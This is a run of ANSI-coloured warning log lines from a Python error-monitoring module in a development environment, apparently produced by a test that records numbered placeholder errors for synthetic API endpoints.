WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793351Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793628Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793734Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793950Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2000'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794052Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2001'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794102Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2002'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2003'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794202Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2004'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2005'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2006'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2007'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2008'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2009'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2010'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794654Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2011'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2012'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2013'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794803Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2014'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2015'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2016'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2017'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
